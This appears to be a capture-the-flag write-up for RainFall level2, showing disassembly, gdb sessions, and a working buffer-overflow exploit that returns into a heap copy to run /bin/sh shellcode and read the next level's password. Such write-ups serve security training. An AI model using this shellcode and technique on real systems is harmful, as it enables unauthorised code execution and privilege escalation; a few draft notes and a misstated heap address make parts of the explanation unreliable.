# Level 2

Once logged in, you will see a binary `level2`.

```
$ ssh level2@localhost -p 4242
          _____       _       ______    _ _
         |  __ \     (_)     |  ____|  | | |
         | |__) |__ _ _ _ __ | |__ __ _| | |
         |  _  /  _` | | '_ \|  __/ _` | | |
         | | \ \ (_| | | | | | | | (_| | | |
         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on localhost:4242
level2@localhost's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
level2@RainFall:~$

```

Let's run this and see what this does.
```
level2@RainFall:~$ ./level2

```

It seems it tries getting input, so let's try typing something.

```
level2@RainFall:~$ ./level2
aaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaa
level2@RainFall:~$
```

It's a bit different from level1: this takes the input and prints out the output.

Now let's take a look at the binary.

```
level2@RainFall:~$ gdb ./level2
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   ebp
   0x08048540 <+1>:     mov    ebp,esp
   0x08048542 <+3>:     and    esp,0xfffffff0
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
gdb-peda$
```

Now, unlike level1, the `p` function is actually called, so let's take a look at function `p`.

```
gdb-peda$ disass p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   ebp
   0x080484d5 <+1>:     mov    ebp,esp
   0x080484d7 <+3>:     sub    esp,0x68
   0x080484da <+6>:     mov    eax,ds:0x8049860
   0x080484df <+11>:    mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    eax,[ebp-0x4c]
   0x080484ea <+22>:    mov    DWORD PTR [esp],eax
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:    mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:    and    eax,0xb0000000
   0x08048500 <+44>:    cmp    eax,0xb0000000
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    eax,0x8048620
   0x0804850c <+56>:    mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:    mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:    mov    DWORD PTR [esp],eax
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    eax,[ebp-0x4c]
   0x0804852a <+86>:    mov    DWORD PTR [esp],eax
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    eax,[ebp-0x4c]
   0x08048535 <+97>:    mov    DWORD PTR [esp],eax
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
End of assembler dump.
gdb-peda$
```

The function we want to take a look at is the ones that have a vulnerability, and same as the level, the function `gets` is used. But, on the line from <+36> to <+49>, some comparison is happening.

This basically restricts from using the technique used from last time (overwriting `eip` [XXX: right buffer?]), because if `eax` is in the range of stack, the `and` operation always will turn into `0xb0000000`, which will result jump into the `0x8048527`

But what if the program instead jumps to the address to heap, instead of the stack? As the `strdup` function is called, the input will be copied to the heap, and if we can put an exploit on the heap somehow, we may be able to get it to execute.

Let's take a look how it works.

From python, let's just try putting the multiple `A`s to check if allocation of heap works.

```
level1@RainFall:~$ python
Python 2.7.3 (default, Jun 22 2015, 19:43:34)
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> print('A' * 80)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Let's feed that into our program.

```
[----------------------------------registers-----------------------------------]
EAX: 0x804a008 ('A' <repeats 64 times>)
EBX: 0xb7fd0ff4 --> 0x1a4d7c
ECX: 0x0
EDX: 0xbffff69c ('A' <repeats 64 times>)
ESI: 0x0
EDI: 0x0
EBP: 0xbffff6e8 ("AAAA")
ESP: 0xbffff680 --> 0xbffff69c ('A' <repeats 64 times>)
EIP: 0x804853d (<p+105>:        leave)
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048532 <p+94>:    lea    eax,[ebp-0x4c]
   0x8048535 <p+97>:    mov    DWORD PTR [esp],eax
   0x8048538 <p+100>:   call   0x80483e0 <strdup@plt>
=> 0x804853d <p+105>:   leave
   0x804853e <p+106>:   ret
   0x804853f <main>:    push   ebp
   0x8048540 <main+1>:  mov    ebp,esp
   0x8048542 <main+3>:  and    esp,0xfffffff0
[------------------------------------stack-------------------------------------]
0000| 0xbffff680 --> 0xbffff69c ('A' <repeats 64 times>)
0004| 0xbffff684 --> 0x0
0008| 0xbffff688 --> 0x0
0012| 0xbffff68c --> 0xb7e5ec73 (add    ebx,0x172381)
0016| 0xbffff690 --> 0x80482b5 ("__libc_start_main")
0020| 0xbffff694 --> 0x0
0024| 0xbffff698 --> 0x2c307d ('}0,')
0028| 0xbffff69c ('A' <repeats 64 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804853d in p ()
gdb-peda$ x/30wx 0x804a008
0x804a008:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a028:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a038:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a048:      0x00000000      0x00020fb9      0x00000000      0x00000000
0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a068:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a078:      0x00000000      0x00000000
gdb-peda$
```
The value is correctly copied, but the size of variable was 64, and it only copied 64 bytes.

To check the address of heap, we can use `info proc mappings` command, and the beginning of the heap is shown below as `0x8048000`.

```
gdb-peda$ info proc mappings
process 26311
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
         0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
         0x804a000  0x806b000    0x21000        0x0 [heap]
        0xb7e2b000 0xb7e2c000     0x1000        0x0
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0
        0xb7fd9000 0xb7fdd000     0x4000        0x0
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

Here we've found our copied memory in the heap.

```
gdb-peda$ x/32wx 0x804a000
0x804a000:      0x00000000      0x00000049      0x41414141      0x41414141
0x804a010:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a040:      0x41414141      0x41414141      0x00000000      0x00020fb9
0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
```

If we just continue, it will access to the memory address with filled with `AAAA`.

```
[----------------------------------registers-----------------------------------]
EAX: 0x804a008 ('A' <repeats 64 times>)
EBX: 0xb7fd0ff4 --> 0x1a4d7c
ECX: 0x0
EDX: 0xbffff69c ('A' <repeats 64 times>)
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff6ec --> 0x8048500 (<p+44>:  cmp    eax,0xb0000000)
EIP: 0x804853e (<p+106>:        ret)
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048535 <p+97>:    mov    DWORD PTR [esp],eax
   0x8048538 <p+100>:   call   0x80483e0 <strdup@plt>
   0x804853d <p+105>:   leave
=> 0x804853e <p+106>:   ret
   0x804853f <main>:    push   ebp
   0x8048540 <main+1>:  mov    ebp,esp
   0x8048542 <main+3>:  and    esp,0xfffffff0
   0x8048545 <main+6>:  call   0x80484d4 <p>
[------------------------------------stack-------------------------------------]
0000| 0xbffff6ec --> 0x8048500 (<p+44>: cmp    eax,0xb0000000)
0004| 0xbffff6f0 --> 0x8048550 (<__libc_csu_init>:      push   ebp)
0008| 0xbffff6f4 --> 0x0
0012| 0xbffff6f8 --> 0x0
0016| 0xbffff6fc --> 0xb7e454d3 (<__libc_start_main+243>:       mov    DWORD PTR [esp],eax)
0020| 0xbffff700 --> 0x1
0024| 0xbffff704 --> 0xbffff794 --> 0xbffff8b3 ("/home/user/level2/level2")
0028| 0xbffff708 --> 0xbffff79c --> 0xbffff8cc ("SHELL=/bin/bash")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804853e in p ()
gdb-peda$ ni
Cannot access memory at address 0x41414145
```

Instead of just `A`s, we can put the code that executes [`shellcode`](http://shell-storm.org/shellcode/files/shellcode-811.php).

If shellcode is passed to the heap, and can be executed, we'll have successfully gotten around the stack address comparison trap. We can exploit this by passing in shellcode by `stdin`, and `strdup` will helpfully put it on the heap for us.

We know the address of the heap where the shellcode will be stored, `0x804a008` => `\x08\xa0\x04\x80`, and the shellcode we used is below:
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80 (28 bytes)
```

XXX: how did we come up with 52 to put the offset?

Let's try using our exploit:

```
level2@RainFall:~$ (python -c "print ('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*52 + '\x08\xa0\x04\x08')" ; cat -) | ./level2
1�Ph//shh/bin����°
                   ̀1�@̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�A
id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
